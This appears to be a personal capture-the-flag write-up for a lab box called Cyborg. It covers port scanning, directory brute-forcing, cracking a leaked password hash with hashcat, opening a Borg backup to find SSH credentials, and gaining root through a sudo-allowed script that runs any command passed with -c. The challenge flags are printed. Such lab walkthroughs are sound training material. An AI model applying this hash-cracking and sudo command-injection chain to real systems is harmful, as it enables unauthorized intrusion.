### Nmap

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 21:11 IST
Nmap scan report for 10.10.102.51
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
|_  256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP

- ferox gives this
```
200      375l      968w    11321c http://10.10.102.51/index.html
301        9l       28w      312c http://10.10.102.51/admin
301        9l       28w      310c http://10.10.102.51/etc
```

- `/etc` has 2 files with the content
`music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
and
```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```


- `/admin` has this username in the content
```
My name is Alex and im a music producer from The United Kingdom!  
This is my office!!!
```

- useful data at `http://10.10.102.51/admin/admin.html`

- we can download an archive using

```
http://10.10.102.51/admin/archive.tar
```

- README had 
```
└──╼ $cat README 
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/

```

- Downloaded and installed the `borgbackup` tool.
refer - [[gpg - Can't check signature and How to install borg or any external binary tool using gpg]]


- When trying to open the borg archive using borg we are prompted for a passphrase

```
─[glack@parrot]─[~/Desktop/THM/cyborg/home/field/dev/final_archive]
└──╼ $borg list .
Enter passphrase for key /home/glack/Desktop/THM/cyborg/home/field/dev/final_archive: 
```

- blank does not work, suspecting `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn` this maybe the password
- Also maybe `archive.tar` is the `music_archive`

- Took a hint from the writeup, used this hashcat command
```
┌─[glack@parrot]─[~/Desktop/THM/cyborg]
└──╼ $hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

and got a hit

```
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```


- When trying to open the `brog` archive this passphrase works

```
─[glack@parrot]─[~/Desktop/THM/cyborg/home/field/dev/final_archive]
└──╼ $borg list .
Enter passphrase for key /home/glack/Desktop/THM/cyborg/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 19:30:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

this is indeed the music archive


### Shell

- Extracted the music archive using 

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/cyborg/home/field/dev/final_archive]
└──╼ $borg extract /home/glack/Desktop/THM/cyborg/home/field/dev/final_archive::music_archive


Enter passphrase for key /home/glack/Desktop/THM/cyborg/home/field/dev/final_archive: 
```

now we can see a new folder as extract i.e. `home`


```
┌─[glack@parrot]─[~/Desktop/THM/cyborg/home/field/dev/final_archive/home]
└──╼ $ls -al
total 0
drwx------ 1 glack glack   8 Sep  2 23:50 .
drwxr-xr-x 1 glack glack 100 Sep  2 23:50 ..
drwxr-xr-x 1 glack glack 222 Dec 29  2020 alex
```



- I found creds in the borg backup `Desktop/THM/cyborg/home/field/dev/final_archive/home/alex/Documents`

```
cat note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

- SSH into the machine as alex
```
alex@ubuntu:~$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```


### Priv ESC

- got the user flag
```
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

- Found out how to get root shell using

```
alex@ubuntu:~$ sudo -l


User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

- Read the contents of `backup.sh`

```

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done



cmd=$($command)
echo $cmd

```


this source code suggests we maybe able to run our own commands as root, but we need to understand what it is doing

- Used this https://www.stackchief.com/tutorials/Bash%20Tutorial%3A%20getopts to understand what `getopts c: flag` this was doing

changed my command to 

`lex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c id`

and got the output of `id`

```
Backup finished
uid=0(root) gid=0(root) groups=0(root)
```

- Ran this command and got root shell

```
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c /bin/bash
```

but was not getting the command outputs, noticed the outputs ere there when trying to exit the root shell


```
root@ubuntu:/etc/mp3backups# id
root@ubuntu:/etc/mp3backups# pwd
root@ubuntu:/etc/mp3backups# cd /root
root@ubuntu:/root# cat root.txt
root@ubuntu:/root# exit
```

after exiting i get

```
exit
uid=0(root) gid=0(root) groups=0(root) /etc/mp3backups flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

